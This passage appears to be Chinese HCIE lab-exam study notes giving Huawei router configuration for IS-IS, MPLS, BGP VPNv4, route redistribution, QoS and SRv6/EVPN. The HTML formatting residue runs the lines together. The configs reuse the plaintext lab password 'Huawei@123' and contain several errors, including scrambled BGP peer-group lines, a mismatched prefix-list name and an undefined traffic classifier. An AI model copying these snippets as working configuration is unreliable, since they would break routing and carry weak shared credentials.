class="hljs-built_in">enable</span> 1 isis circuit-type p2p <span class="hljs-comment"># 线路类型</span> isis ppp-negotiation 2-way <span class="hljs-comment"># ppp 协商</span> isis authentication-mode md5 plain Huawei@123interface GigabitEthernet0/0/1 isis <span class="hljs-built_in">enable</span> 1 isis circuit-type p2p isis ppp-negotiation 2-way isis authentication-mode md5 plain Huawei@123interface GigabitEthernet0/0/2 isis <span class="hljs-built_in">enable</span> 1 isis cost 4 isis circuit-type p2p isis ppp-negotiation 2-way isis authentication-mode md5 plain Huawei@123 quit<span class="hljs-comment"># X_PEX 多开窗口</span>dis isis peer <span class="hljs-comment"># 3个</span>dis isis bfd session all <span class="hljs-comment"># 3个</span><span class="hljs-comment"># X_PE1</span>dis ip routing-table 5.0.0.5 verboseint GigabitEthernet 0/0/1 shutdown tracert -a 1.0.0.1 5.0.0.5 undo shutdown quit2、 全局MPLS配置<span class="hljs-comment"># X/Y/Z_PE1/2</span><span class="hljs-comment"># mpls lsr-id X.0.0.X</span>bfd mpls-passive quitmpls lsr-id 1.0.0.1mpls mpls bfd <span class="hljs-built_in">enable</span> mpls bfd-trigger host mpls bfd min-tx-interval 500 min-rx-interval 500 quitmpls ldp quitinterface GigabitEthernet0/0/0 mpls mpls ldp mpls mtu 1382 isis ldp-syncinterface GigabitEthernet0/0/1 mpls mpls ldp mpls mtu 1382 isis ldp-syncinterface GigabitEthernet0/0/2 mpls mpls ldp mpls mtu 1382 isis ldp-sync quit<span class="hljs-comment"># 检查</span>dis mpls ldp peer <span class="hljs-comment"># 3个</span>dis mpls bfd session <span class="hljs-comment"># 7个</span>display bfd session all <span class="hljs-comment"># 17个</span>dis isis ldp-sync interface <span class="hljs-comment"># 3个</span>3、 BGP 65000 / group IBGP / vpnv4配置<span class="hljs-comment"># X_PE1/2</span><span class="hljs-comment"># router-id 2.0.0.2</span><span class="hljs-comment"># peer 2.0.0.2 as-number 65000</span><span class="hljs-comment"># peer 2.0.0.2 group IBGP</span><span class="hljs-comment"># peer 2.0.0.2 enable</span>bgp 65000 router-id 1.0.0.1 undo default ipv4-unicast <span class="hljs-comment"># 配置BGP对等体默认不在任何地址族下使能</span> group IBGP internal <span class="hljs-comment"># 创建IBGP对等体组</span> peer IBGP connect-interface Loopback 0 <span class="hljs-comment"># 使用loopback0接口建立BGP邻居关系</span> peer IBGP bfd min-rx-interval 500 min-tx-interval 500 peer IBGP bfd <span class="hljs-built_in">enable</span> peer IBGP password cipher Huawei@123 peer 2.0.0.2 as-number 65000 peer 2.0.0.2 group IBGP peer 3.0.0.3 as-number 65000 peer 3.0.0.3 group IBGP peer 4.0.0.4 as-number 65000 peer 4.0.0.4 group IBGP peer 4.0.0.4 as-number 65000 peer 5.0.0.5 group IBGP peer 5.0.0.5 as-number 65000 peer 6.0.0.6 group IBGP ipv4-family vpnv4  undo policy vpn-target <span class="hljs-comment"># (RR)用来取消对接收的VPN路由或者标签块进行VPN-Target过滤的,保证所有的VPN路由或者标签块都能被接收和处理。</span>  reflector cluster-id 65000 <span class="hljs-comment"># 配置反射器集群ID，所有RR配置相同，建议使用AS号作为集群ID</span>  peer 2.0.0.2 <span class="hljs-built_in">enable</span>  peer 3.0.0.3 <span class="hljs-built_in">enable</span>  peer 3.0.0.3 reflect-client <span class="hljs-comment"># 本机作为路由反射器，并将指定的对等体（组）作为路由反射器的客户。</span>  peer 4.0.0.4 <span class="hljs-built_in">enable</span>  peer 4.0.0.4 reflect-client  peer 5.0.0.5 <span class="hljs-built_in">enable</span>  peer 5.0.0.5 reflect-client  peer 6.0.0.6 <span class="hljs-built_in">enable</span>  peer 6.0.0.6 reflect-client  quit quit<span class="hljs-comment"># Y/Z_PE1/2</span><span class="hljs-comment"># router-id X.0.0.X # 3,4,5,6</span>bgp 65000 router-id 3.0.0.3 undo default ipv4-unicast peer 1.0.0.1 as-number 65000 peer 1.0.0.1 connect-interface LoopBack0 peer 1.0.0.1 bfd <span class="hljs-built_in">enable</span> peer 1.0.0.1 bfd min-tx-interval 500 min-rx-interval 500 peer 1.0.0.1 password cipher Huawei@123 peer 2.0.0.2 as-number 65000 peer 2.0.0.2 connect-interface LoopBack0 peer 2.0.0.2 bfd <span class="hljs-built_in">enable</span> peer 2.0.0.2 bfd min-tx-interval 500 min-rx-interval 500 peer 2.0.0.2 password cipher Huawei@123 <span class="hljs-comment">#</span> ipv4-family vpnv4  peer 1.0.0.1 <span class="hljs-built_in">enable</span>  peer 2.0.0.2 <span class="hljs-built_in">enable</span>  quit<span class="hljs-comment"># 检查</span>dis bgp vpnv4 all peer <span class="hljs-comment"># X5个 Y2个 Z2个</span>dis bgp bfd session all <span class="hljs-comment"># X5个 </span>4、 [65000, 65001] VPN-Instance / IP / route-policy / BGP<span class="hljs-comment">## X_PE1/2</span><span class="hljs-comment"># vpn-instance</span><span class="hljs-comment">#  route-distinguisher 65001:2</span>ip vpn-instance OA ipv4-family  route-distinguisher 65001:1 <span class="hljs-comment"># 配置VPN实例IPv4地址族的RD</span>  vpn-target 1:1 export-extcommunity <span class="hljs-comment"># 必须将对方的export-extcommunity的VPN Target值配置为自己的import-extcommunity的VPN Target值</span>  vpn-target 2:2 import-extcommunity  quit quit<span class="hljs-comment"># ip binding vpn-instance</span><span class="hljs-comment">#   ip address 10.20.1.10 30</span>dis ip int briefinterface GigabitEthernet2/0/0 ip binding vpn-instance OA ip address 10.20.1.2 30 quit<span class="hljs-comment"># X_PE1 oa主路径</span><span class="hljs-comment">#  apply cost 12</span>route-policy oa_med permit node 10 apply cost-type internal <span class="hljs-comment"># 继承</span> quit<span class="hljs-comment"># BGP绑定VPN-instance</span><span class="hljs-comment">#   peer 10.20.1.9 as-number 65001</span><span class="hljs-comment">#   peer 10.20.1.9 route-policy oa_med export</span>bgp 65000 ipv4-family vpn-instance OA  peer 10.20.1.1 as-number 65001  peer 10.20.1.1 route-policy oa_med <span class="hljs-built_in">export</span>  quit quit<span class="hljs-comment">## X_T1_Export1</span><span class="hljs-comment"># ip</span><span class="hljs-comment">#  ip address 10.20.1.9 30</span><span class="hljs-comment">#  ip address 10.20.1.6 30</span>interface GigabitEthernet2/0/0 ip address 10.20.1.1 30interface GigabitEthernet2/0/1 ip address 10.20.1.5 30 quit<span class="hljs-comment"># X双点双路路由重发布</span>acl 2001 rule permit <span class="hljs-built_in">source</span> 10.1.11.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.12.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.13.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.14.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.15.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.21.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.22.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.23.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.24.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.25.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.31.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.32.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.33.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.34.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.35.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.41.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.42.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.43.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.44.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.45.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.51.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.52.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.53.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.54.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.55.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.20.1.4 0 quitroute-policy b2o permit node 10 apply tag 10 quitroute-policy o2b deny node 10 if-match tag 20 quitroute-policy o2b permit node 20 if-match acl 2001 quitdis cur config route-policy<span class="hljs-comment"># OSPF</span>ospf 1 import-route bgp route-policy b2o default cost inherit-metric quit<span class="hljs-comment">#</span><span class="hljs-comment"># BGP</span><span class="hljs-comment">#  router-id 10.1.0.2</span><span class="hljs-comment">#  peer 10.20.1.10 as-number 65000</span>bgp 65001 router-id 10.1.0.1 dis ip int brief peer 10.20.1.2 as-number 65000 network 10.20.1.4 30 preference 120 255 255 import-route ospf 1 route-policy o2b quit<span class="hljs-comment"># 检查</span>dis ip routing-table 10.2.31.0dis ip routing-table 10.2.51.0dis ip routing-table protocol ospf  <span class="hljs-comment"># 70 49 21</span><span class="hljs-comment">## X_PE1</span>dis ip routing-table vpn-instance OA <span class="hljs-comment"># 51</span>dis bgp vpnv4 vpn-instance OA routing-table <span class="hljs-comment"># 120</span><span class="hljs-comment">## X_PE1</span>dis bgp vpnv4 vpn-instance OA routing-table <span class="hljs-comment"># 112</span><span class="hljs-comment">## X_T1_CORE</span>dis ip routing-table protocol ospf <span class="hljs-comment"># 67</span><span class="hljs-comment">## Y_PE1</span>dis ip routing-table vpn-instance OA 10.3.101.0 verbose5、 [65000, 65003] VPN-Instance / IP / route-policy / BGP<span class="hljs-comment">## Y_PE1/2</span><span class="hljs-comment"># VPN-Instance</span><span class="hljs-comment">#  route-distinguisher 65003:2</span><span class="hljs-comment">#  route-distinguisher 65003:4</span>ip vpn-instance OA ipv4-family  route-distinguisher 65003:1  vpn-target 1:1 export-extcommunity  vpn-target 2:2 import-extcommunity  quit quitip vpn-instance R&amp;D ipv4-family  route-distinguisher 65003:3  vpn-target 3:3 export-extcommunity  vpn-target 4:4 import-extcommunity  quit quit<span class="hljs-comment"># IP binding vpn-instance</span><span class="hljs-comment">#  ip address 10.20.2.10 30</span><span class="hljs-comment">#  ip address 10.20.2.14 30</span>interface GigabitEthernet2/0/0.10 dot1q termination vid 10 <span class="hljs-comment"># 开启识别802.1Q数据帧，同时将子接口划分给相应的vlan</span> ip binding vpn-instance OA ip address 10.20.2.2 30 arp broadcast <span class="hljs-built_in">enable</span>interface GigabitEthernet2/0/0.20 dot1q termination vid 20 ip binding vpn-instance R&amp;D ip address 10.20.2.6 30 arp broadcast <span class="hljs-built_in">enable</span> quit<span class="hljs-comment">## Y_PE1 oa主路径，rd备路径</span><span class="hljs-comment"># apply cost 12</span><span class="hljs-comment"># apply cost-type internal</span>route-policy oa_med permit node 10 apply cost-type internal quitroute-policy rd_med permit node 10 apply cost 12 quit<span class="hljs-comment"># BGP绑定VPN-instance</span><span class="hljs-comment">#  peer 10.20.2.9 as-number 65003</span><span class="hljs-comment">#  peer 10.20.2.9 route-policy oa_med export</span><span class="hljs-comment">#  peer 10.20.2.13 as-number 65003</span><span class="hljs-comment">#  peer 10.20.2.13 route-policy rd_med export</span>bgp 65000 ipv4-family vpn-instance OA  peer 10.20.2.1 as-number 65003  peer 10.20.2.1 route-policy oa_med <span class="hljs-built_in">export</span> ipv4-family vpn-instance R&amp;D  peer 10.20.2.5 as-number 65003  peer 10.20.2.5 route-policy rd_med <span class="hljs-built_in">export</span>  quit quit<span class="hljs-comment">## Y_Export1</span>interface GigabitEthernet0/0/7undo portswitchinterface GigabitEthernet0/0/6undo portswitch<span class="hljs-comment"># ip binding vpn-instance</span><span class="hljs-comment">#  interface GigabitEthernet2/0/1.10</span><span class="hljs-comment">#   ip address 10.20.2.9 30</span><span class="hljs-comment">#  interface GigabitEthernet2/0/1.20</span><span class="hljs-comment">#   ip address 10.20.2.13 30</span>interface GigabitEthernet2/0/0.10 dot1q termination vid 10 ip binding vpn-instance vpn2 ip address 10.20.2.1 30 arp broadcast <span class="hljs-built_in">enable</span>interface GigabitEthernet2/0/0.20 dot1q termination vid 20 ip binding vpn-instance vpn3 ip address 10.20.2.5 30 arp broadcast <span class="hljs-built_in">enable</span> quit<span class="hljs-comment"># Y过滤路由</span>ip ip-prefix deny_Default deny 0.0.0.0 0ip ip-prefix deny_Default permit 0.0.0.0 0 less-equal 32ip ip-prefix OA permit 10.2.0.0 16 greater-equal 24 less-equal 24 ip ip-prefix OA permit 10.100.2.0 24ip ip-prefix R&amp;D permit 10.2.0.0 16 greater-equal 24 less-equal 24ip ip-prefix R&amp;D permit 10.100.3.0 24<span class="hljs-comment"># BGP绑定VPN-instance</span>bgp 65003 ipv4-family vpn-instance vpn2  peer 10.20.2.2 as-number 65000  peer 10.20.2.2 ip-prefix deny_default <span class="hljs-built_in">export</span>  peer 10.20.2.2 ip-prefix OA <span class="hljs-built_in">export</span>  peer 10.20.2.10 as-number 65000  peer 10.20.2.10 ip-prefix deny_default <span class="hljs-built_in">export</span>   peer 10.20.2.10 ip-prefix OA <span class="hljs-built_in">export</span> ipv4-family vpn-instance vpn3  peer 10.20.2.6 as-number 65000  peer 10.20.2.6 ip-prefix R&amp;D <span class="hljs-built_in">export</span>  peer 10.20.2.14 as-number 65000  peer 10.20.2.14 ip-prefix R&amp;D <span class="hljs-built_in">export</span>  quit quit<span class="hljs-comment"># 配置RD业务QOS</span>acl number 3001  rule permit ip <span class="hljs-built_in">source</span> 10.2.11.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.12.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.13.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.14.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.15.0 0.0.0.255  description rdacl number 3002  rule permit ip <span class="hljs-built_in">source</span> 10.2.21.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.22.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.23.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.24.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.25.0 0.0.0.255  description producttraffic classifier rd  if-match acl 3001traffic classifier pro  if-match acl 3002traffic behavior pro  remark dscp ef  queue llq bandwidth 100000traffic behavior rd  remark dscp af41  queue af bandwidth 300000traffic policy RD  classifier rd behavior rd  classifier pro behavior prointerface GigabitEthernet0/0/6.20  traffic-policy RD outboundinterface GigabitEthernet0/0/7.20  traffic-policy RD outbound6、 [65000, 65004] VPN-Instance/IP/BGP<span class="hljs-comment">## Z_PE1/2</span><span class="hljs-comment"># vpn-instance</span><span class="hljs-comment">#  route-distinguisher 65004:3</span><span class="hljs-comment">#  route-distinguisher 65004:4</span><span class="hljs-comment">#  route-distinguisher 65004:6</span>ip vpn-instance OA_In ipv4-family  route-distinguisher 65004:1  vpn-target 1:1 import-extcommunityip vpn-instance OA_Out ipv4-family  route-distinguisher 65004:2  vpn-target 2:2 export-extcommunityip vpn-instance R&amp;D ipv4-family  route-distinguisher 65004:5  vpn-target 3:3 import-extcommunity  vpn-target 4:4 export-extcommunity  quit quit<span class="hljs-comment">#</span>dis bgp vpnv4 all peer <span class="hljs-comment"># Y=4</span><span class="hljs-comment"># ip binding vpn-instance</span><span class="hljs-comment">#  ip add 10.20.3.14 30</span><span class="hljs-comment">#  ip add 10.20.3.18 30</span><span class="hljs-comment">#  ip add 10.20.3.22 30</span>int g 2/0/0.10 dot1q termination vid 10 ip binding vpn-instance OA_In ip add 10.20.3.2 30 arp broadcast <span class="hljs-built_in">enable</span>int g 2/0/0.11 dot1q termination vid 11 ip binding vpn-instance OA_Out ip add 10.20.3.6 30 arp broadcast <span class="hljs-built_in">enable</span>int g 2/0/0.20 dot1q termination vid 20 ip binding vpn-instance R&amp;D ip add 10.20.3.10 30 arp broadcast <span class="hljs-built_in">enable</span> quit<span class="hljs-comment">## Z_PE1 oa主路径，rd备路径</span><span class="hljs-comment"># apply cost 12</span><span class="hljs-comment"># apply cost-type internal</span>route-policy oa_med permit node 10 apply cost-type internal quitroute-policy rd_med permit node 10 apply cost 12 quit<span class="hljs-comment"># BGP绑定VPN-instance</span><span class="hljs-comment">#  peer 10.20.3.13 as-number 65004</span><span class="hljs-comment">#  peer 10.20.3.13 route-policy oa_med export</span><span class="hljs-comment">#  peer 10.20.3.17 as-number 65004</span><span class="hljs-comment">#  peer 10.20.3.21 as-number 65004</span><span class="hljs-comment">#  peer 10.20.3.21 route-policy rd_med export</span>bgp 65000 ipv4-family vpn-instance OA_In  peer 10.20.3.1 as-number 65004  peer 10.20.3.1 route-policy oa_med <span class="hljs-built_in">export</span> ipv4-family vpn-instance OA_Out  peer 10.20.3.5 as-number 65004  peer 10.20.3.5 allow-as-loop ipv4-family vpn-instance R&amp;D  peer 10.20.3.9 as-number 65004  peer 10.20.3.9 route-policy rd_med <span class="hljs-built_in">export</span>  quit quit<span class="hljs-comment">## Z_Export1</span><span class="hljs-comment"># vpn-instance</span>ip vpn-instance OA route-distinguisher 65004:10  quitip vpn-instance R&amp;D route-distinguisher 65004:20  quit<span class="hljs-comment">#</span>int lo0 ip binding vpn-instance OA ip add 10.3.101.254 24int lo1 ip binding vpn-instance R&amp;D ip add 10.3.99.254 24int lo2 ip binding vpn-instance R&amp;D ip add 10.3.100.254 24 quit<span class="hljs-comment"># ip binding vpn-instance</span><span class="hljs-comment">#  int g 0/0/1.10</span><span class="hljs-comment">#   ip add 10.20.3.13 30</span><span class="hljs-comment">#  int g 0/0/1.11</span><span class="hljs-comment">#   ip add 10.20.3.17 30</span><span class="hljs-comment">#  int g 0/0/1.20</span><span class="hljs-comment">#   ip add 10.20.3.21 30</span>int g 0/0/0.10 dot1q termination vid 10 ip binding vpn-instance OA ip add 10.20.3.1 30 arp broadcast <span class="hljs-built_in">enable</span>int g 0/0/0.11 dot1q termination vid 11 ip binding vpn-instance OA ip add 10.20.3.5 30 arp broadcast <span class="hljs-built_in">enable</span>int g 0/0/0.20 dot1q termination vid 20 ip binding vpn-instance R&amp;D ip add 10.20.3.9 30 arp broadcast <span class="hljs-built_in">enable</span> quitdis ip int brief<span class="hljs-comment"># BGP绑定VPN-Instance</span>bgp 65004 router-id 10.3.99.254 undo default ipv4-unicast ipv4-family vpn-instance OA  network 10.3.101.0 24  peer 10.20.3.2 as-number 65000  peer 10.20.3.6 as-number 65000  peer 10.20.3.14 as-number 65000  peer 10.20.3.18 as-number 65000 ipv4-family vpn-instance R&amp;D   network 10.3.99.0 24  network 10.3.100.0 24  peer 10.20.3.10 as-number 65000  peer 10.20.3.22 as-number 65000  quit quit <span class="hljs-comment"># 检查</span><span class="hljs-comment">## Z_Export1</span>dis bgp vpnv4 all peer <span class="hljs-comment"># 6</span><span class="hljs-comment">## X_T_Export1/2</span>dis bgp routing-table <span class="hljs-comment"># 21</span><span class="hljs-comment">## Y_Export1</span>dis ip routing-table vpn-instance vpn2 <span class="hljs-comment"># 64 63</span>dis bgp vpnv4 vpn-instance vpn2 routing-table <span class="hljs-comment"># 42</span>dis bgp vpnv4 vpn-instance vpn3 routing-table <span class="hljs-comment"># 30 -------to do</span><span class="hljs-comment">## Z_Export1</span>dis bgp vpnv4 vpn-instance OA routing-table <span class="hljs-comment"># 41</span>dis bgp vpnv4 vpn-instance R&amp;D routing-table <span class="hljs-comment"># 28</span><span class="hljs-comment">## Z_PE1</span>dis bgp vpnv4 vpn-instance OA_In routing-table <span class="hljs-comment"># 41 --- to do 21</span>dis bgp vpnv4 vpn-instance OA_Out routing-table <span class="hljs-comment"># 21</span>7、VPN FRR / QOS / 防止OA路由倒灌<span class="hljs-comment">## VPN FRR</span><span class="hljs-comment"># X/Y_PE1</span>route-policy vpnfrr permit node 10 apply backup-interface g 0/0/2  apply backup-nexthop 6.0.0.6 quitip vpn-instance OA vpn frr route-policy vpnfrr quit<span class="hljs-comment"># X_PE1</span>dis ip routing-table vpn-instance OA 10.2.31.0 verbose<span class="hljs-comment"># Y_PE1</span>dis ip routing-table vpn-instance OA 10.3.101.0 verbose<span class="hljs-comment">## QOS</span><span class="hljs-comment">## X/Y/Z_PE1/2</span>drop-profile rd wred dscp dscp af41 low-limit 50 high-limit 90 discard-percentage 50traffic classifier rd if-match dscp af41 traffic classifier product if-match dscp eftraffic behavior rd queue af bandwidth 300000 drop-profile discovertraffic behavior product queue llq bandwidth 100000traffic policy R&amp;D classifier discover behavior rd classifier product behavior productint g 0/0/0 traffic-policy R&amp;D outboundint g 0/0/1 traffic-policy R&amp;D outboundint g 0/0/2 traffic-policy R&amp;D outbound<span class="hljs-comment">## Z_PE1/2</span>int g 2/0/0.20 traffic-policy R&amp;D outbound quit<span class="hljs-comment">## X_T_Export1</span>tracert  -a 10.20.1.5 10.100.2.1<span class="hljs-comment">## Y_Export1</span>ping -vpn-instance vpn3 -a 10.100.3.1 10.3.99.254<span class="hljs-comment">## </span><span class="hljs-comment">## 防止OA路由倒灌</span><span class="hljs-comment"># X_PE1/PE2</span>ip ip-prefix YZ index 10 deny 10.1.0.0 16 greater-equal 16 less-equal 32ip ip-prefix YZ index 20 deny 10.20.1.4 30ip ip-prefix YZ index 30 permit 0.0.0.0 0 less-equal 32route-policy YZ permit node 10if-match ip-prefix YZip vpn-instance OAimport route-policy YZ<span class="hljs-comment"># Y_PE1/PE2</span>ip ip-prefix XZ index 10 deny 10.2.0.0 16 greater-equal 16 less-equal 32ip ip-prefix XZ index 20 deny 10.100.2.0 24ip ip-prefix XZ index 30 permit 0.0.0.0 0 less-equal 32route-policy XZ permit node 10if-match ip-prefix XZip vpn-instance OAimport route-policy XZZ园区: SRv61、全局ISIS IPv6配置（IBG打通）<span class="hljs-comment">## PEX</span>bfd<span class="hljs-comment">#</span>isis 1  is-level level-2  cost-style wide  network-entity 49.0001.00X0.0000.000X.00  ipv6 <span class="hljs-built_in">enable</span> topology ipv6  ipv6 bfd all-interfaces <span class="hljs-built_in">enable</span>  ipv6 bfd all-interfaces min-tx-interval 15 min-rx-interval 15 //模拟器 300  domain-authentication-mode md5 plain Huawei@123<span class="hljs-comment">#</span>interface loopback0  isis ipv6 <span class="hljs-built_in">enable</span> 1<span class="hljs-comment">#</span>interface G0/2/28  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis authentication-mode md5 cipher Huawei@123  isis ppp-negotiation 2-way<span class="hljs-comment">#</span>interface G0/2/29  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis authentication-mode md5 cipher Huawei@123  isis ppp-negotiation 2-way<span class="hljs-comment">#</span>interface G0/2/30  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis authentication-mode md5 cipher Huawei@123  isis ppp-negotiation 2-way  isis ipv6 cost 4<span class="hljs-comment">## 检查</span>dis ipv6 routing-table fc00::5:5 verbose <span class="hljs-comment"># X_PE1</span>dis isis route ipv6 <span class="hljs-comment"># X_PE1</span>2、部署SRv6 Locator 和 Opcode静态<span class="hljs-comment">## PEX </span><span class="hljs-comment">## 部署 SRv6 Locator</span>segment-routing ipv6  sr-te frr <span class="hljs-built_in">enable</span>  encapsulation source-address FC00::X:X //Loopback0 ipv6 地址  locator HCIE ipv6-prefix FC02:X:: 96 static 16 //注意考场有没要求特点前缀<span class="hljs-comment">#</span>isis 1  segment-routing ipv6 locator HCIE  avoid-microloop frr-protected  ipv6 avoid-microloop segment-routing  ipv6 frr    loop-free-alternate level-2<span class="hljs-comment">## Opcode静态部署</span><span class="hljs-comment"># X_PE1</span>segment-routing ipv6  locator HCIE    opcode ::1 end psp    opcode ::10 end-x interface G0/2/30 nexthop FC01:10::A psp    opcode ::20 end-x interface G0/2/28 nexthop FC01:10::2 psp    opcode ::30 end-x interface G0/2/29 nexthop FC01:10::6 psp    opcode ::100 end-op<span class="hljs-comment"># X_PE2</span>segment-routing ipv6  locator HCIE    opcode ::1 end psp    opcode ::10 end-x interface G0/2/30 nexthop FC01:10::9 psp    opcode ::20 end-x interface G0/2/28 nexthop FC01:10::E psp    opcode ::30 end-x interface G0/2/29 nexthop FC01:10::12 psp<span class="hljs-comment"># Y_PE1</span>segment-routing ipv6  locator HCIE    opcode ::1 end psp    opcode ::10 end-x interface G0/2/30 nexthop FC01:10::1A psp    opcode ::20 end-x interface G0/2/28 nexthop FC01:10::1 psp    opcode ::30 end-x interface G0/2/29 nexthop FC01:10::16 psp    opcode ::100 end-op<span class="hljs-comment"># Y_PE2</span>segment-routing ipv6  locator HCIE    opcode ::1 end psp    opcode ::10 end-x interface G0/2/30 nexthop FC01:10::19 psp    opcode ::20 end-x interface G0/2/28 nexthop FC01:10::D psp    opcode ::30 end-x interface G0/2/29 nexthop FC01:10::1E psp    opcode ::100 end-op<span class="hljs-comment"># Z_PE1</span>segment-routing ipv6  locator HCIE    opcode ::1 end psp    opcode ::10 end-x interface G0/2/30 nexthop FC01:10::22 psp    opcode ::20 end-x interface G0/2/28 nexthop FC01:10::5 psp    opcode ::30 end-x interface G0/2/29 nexthop FC01:10::15 psp    opcode ::100 end-op<span class="hljs-comment"># Z_PE2</span>segment-routing ipv6  locator HCIE    opcode ::1 end psp    opcode ::10 end-x interface G0/2/30 nexthop FC01:10::21 psp    opcode ::20 end-x interface G0/2/28 nexthop FC01:10::11 psp    opcode ::30 end-x interface G0/2/29 nexthop FC01:10::1D psp    opcode ::100 end-op<span class="hljs-comment">## 检查</span>ping ipv6-sid segment-by-segment fc02:2::10 <span class="hljs-comment"># X_PE1</span>ping ipv6-sid segment-by-segment fc02:2::20 <span class="hljs-comment"># X_PE1</span>ping ipv6-sid segment-by-segment fc02:2::30 <span class="hljs-comment"># X_PE1</span>ping ipv6-sid segment-by-segment fc02:3::10 <span class="hljs-comment"># X_PE1</span>ping ipv6-sid segment-by-segment fc02:3::20 <span class="hljs-comment"># X_PE1</span>ping ipv6-sid segment-by-segment fc02:3::30 <span class="hljs-comment"># X_PE1</span>ping ipv6-sid segment-by-segment fc02:4::10 <span class="hljs-comment"># X_PE1</span>ping ipv6-sid segment-by-segment fc02:4::20 <span class="hljs-comment"># X_PE1</span>ping ipv6-sid segment-by-segment fc02:4::30 <span class="hljs-comment"># X_PE1</span>ping ipv6-sid segment-by-segment fc02:5::10 <span class="hljs-comment"># X_PE1</span>ping ipv6-sid segment-by-segment fc02:5::20 <span class="hljs-comment"># X_PE1</span>ping ipv6-sid segment-by-segment fc02:5::30 <span class="hljs-comment"># X_PE1</span>ping ipv6-sid segment-by-segment fc02:6::10 <span class="hljs-comment"># X_PE1</span>ping ipv6-sid segment-by-segment fc02:6::20 <span class="hljs-comment"># X_PE1</span>ping ipv6-sid segment-by-segment fc02:6::30 <span class="hljs-comment"># X_PE1</span>ping ipv6-sid segment-by-segment fc02:1::10 <span class="hljs-comment"># X_PE2</span>ping ipv6-sid segment-by-segment fc02:1::20 <span class="hljs-comment"># X_PE2</span>ping ipv6-sid segment-by-segment fc02:1::30 <span class="hljs-comment"># X_PE2</span>dis segment-routing ipv6 local-sid locator HCIE forwarding3、BGP 65000 / EVPN 配置<span class="hljs-comment">## Z_PE1/2</span>bgp 65000  router-id X.0.0.X //手动配置 RID  peer FC00::1 as-number 65000  peer FC00::1 connect-interface loopback 0  peer FC00::1 password simple Huawei@123  peer FC00::2 as-number 65000  peer FC00::2 connect-interface loopback 0  peer FC00::2 password simple Huawei@123  peer FC00::3 as-number 65000  peer FC00::3 connect-interface loopback 0  peer FC00::3 password simple Huawei@123  peer FC00::4 as-number 65000  peer FC00::4 connect-interface loopback 0  peer FC00::4 password simple Huawei@123 (考场看需求配置)  l2vpn-family evpn    policy vpn-target    peer FC00::1 <span class="hljs-built_in">enable</span>    y    peer FC00::1 advertise encap-type srv6    peer FC00::2 <span class="hljs-built_in">enable</span>    y    peer FC00::2 advertise encap-type srv6    peer FC00::3 <span class="hljs-built_in">enable</span>    y    peer FC00::3 advertise encap-type srv6    peer FC00::4 <span class="hljs-built_in">enable</span>    y    peer FC00::4 advertise encap-type srv6    quit  quit<span class="hljs-comment">## X/Y_PE1/2</span>bgp 65000  router-id X.0.0.X 手动配置 RID  peer FC00::5 as-number 65000  peer FC00::5 connect-interface loopback 0  peer FC00::5 password simple Huawei@123  peer FC00::6 as-number 65000  peer FC00::6 connect-interface loopback 0  peer FC00::6 password simple Huawei@123  l2vpn-family evpn    policy vpn-target    peer FC00::5 <span class="hljs-built_in">enable</span>    y    peer FC00::5 advertise encap-type srv6    peer FC00::6 <span class="hljs-built_in">enable</span>    y    peer FC00::6 advertise encap-type srv6    quit  quit<span class="hljs-comment">## 检查</span>dis bgp evpn peer4、[65000, 65001] vpn-instance / IP / BGP EVPN / 双点双站路由重分布<span class="hljs-comment">## X_PE1</span>ip vpn-instance OA  route-distinguisher 65001:1  vpn-target 1:4 export-extcommunity evpn  vpn-target 4:1 import-extcommunity evpn<span class="hljs-comment">#</span>interface G0/2/31  ip binding vpn-instance OA  ip address 10.20.1.2 30<span class="hljs-comment">#</span>bgp 65000  ipv4-family vpn-instance OA    advertise l2vpn evpn    segment-routing ipv6 traffic-engineer best-effort evpn    segment-routing ipv6 locator HCIE evpn    peer 10.20.1.1 as-number 65001    quit  quit<span class="hljs-comment"># SRv6 Policy部署</span>segment-routing ipv6  srv6-te-policy locator HCIE  segment-list x1-z1-zhu    index 10 sid ipv6 FC02:1::30  segment-list x1-z1-bei    index 10 sid ipv6 FC02:1::10    index 20 sid ipv6 FC02:2::30    index 30 sid ipv6 FC02:6::10srv6-te policy x1-z1 endpoint FC00::5 Color 101  candidate-path preference 200    segment-list x1-z1-zhu  candidate-path preference 100    segment-list x1-z1-bei<span 